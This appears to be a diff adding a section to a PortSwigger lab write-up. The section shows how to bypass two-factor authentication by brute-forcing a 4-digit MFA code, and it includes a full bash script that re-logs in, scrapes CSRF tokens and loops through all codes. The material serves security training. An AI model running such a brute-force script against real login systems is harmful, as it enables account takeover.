@@ -325,7 +325,75 @@ It showed that I was logged in as carlos, but not lab solved.\
 Just going to *my account* solved the lab.
 
 
+## LAB : 2FA bypass using a brute-force attack
 
+
+Here we have the valid credentials of carlos (carlos / montoya), but we will have to brute-force the MFA code.\
+However, we can only try 2 MFA codes before we have to login with the credentials again.
+
+Assuming that the MFA code doesn't change after each login, the idea is to login as carlos, try an MFA code; login as carlos again, try another MFA code; ...\
+The problem here is, when you capture the login request in Burp, you'll see that they add a CSRF token with the login. And this changes every single login attempt.\
+So what we have to do is: 
+* GET the login page, exactract the CSRF token and Session cookie
+* POST the login page, with the CSRF token and carlos' credentials
+* Meanwhile, get the 2nd CSRF token and new Session cookie
+* POST the login2 page with a MFA code, the 2nd CSRF token and the new Session cookie.
+* Check for a warning message of a incorrect MFA code. (Or actually the absence of the warning message)
+
+This can be done in Burp, using a macro, and is actually quite easy.\
+The problem is, with the community edition of Brup, the actual brute-force of the MFA code takes waaaaay too long. \
+I've let Burp running a few times, and every time I get to around code 1000, the lab is shut down. And that's only 10% of the codes...
+
+Caido doesn't have this macro feature (or at least not as far as I know). So I'll have to move to good ol' bash:
+
+```bash
+#!/bin/bash
+
+HOST="https://0aa20064036cc57e8048946a00fb0089.web-security-academy.net/"
+LOGIN1="login"
+LOGIN2="login2"
+USERNAME="carlos"
+PASSWORD="montoya"
+
+echo $(date)
+
+for i in {0..9999}; do 
+
+  code=$i
+  # Making sure that the MFA code is at least 4 digits, prepending zero's to numbers smaller than 1000.
+  while [[ ${#code} -lt 4 ]]; do code="0"$code; done
+  echo -n "Attempt with MFA code :  ${code}         "
+
+
+
+  # 1)  GET the login page, and extract the CSRF token and Session cookie
+  CSRF1=$(wget -qO- --keep-session-cookies --save-cookies cookies.txt ${HOST}${LOGIN1} | grep -i "csrf" | awk -F '"' '{ print $6 }')
+  echo -n "CSRF-token #1:  ${CSRF1}             "
+
+
+  # 2)  POST the login page, with the CSRF-token and the credentials; and passing the cookies
+  CSRF2=$(wget -qO- --post-data "csrf=${CSRF1}&username=${USERNAME}&password=${PASSWORD}" --keep-session-cookies --load-cookies cookies.txt --save-cookies cookies2.txt ${HOST}${LOGIN1} | grep -i "csrf" | awk -F '"' '{ print $6 }')
+  echo -n "CSRF-token #2:  ${CSRF2}         "
+
+  # 3)  POST the login2 page with the MFA code
+  WARNING=$(wget -qO- --post-data "csrf=${CSRF2}&mfa-code=${code}" --load-cookies cookies2.txt ${HOST}${LOGIN2} | grep "is-warning" | sed 's/<p class=is-warning>//' | sed 's/<\/p>//')
+
+  echo "Warning:  ${WARNING}"
+
+
+  # If there is no warning, we have the correct code, so we can stop
+  if [[ "${WARNING}" == "" ]]; then
+    break
+  fi
+
+done
+
+echo $(date)
+```
+{: .nolineno}
+And within 21 minutes, I had my 17xx MFA code.
+
+Lab solved.
 
 
 ## Credits
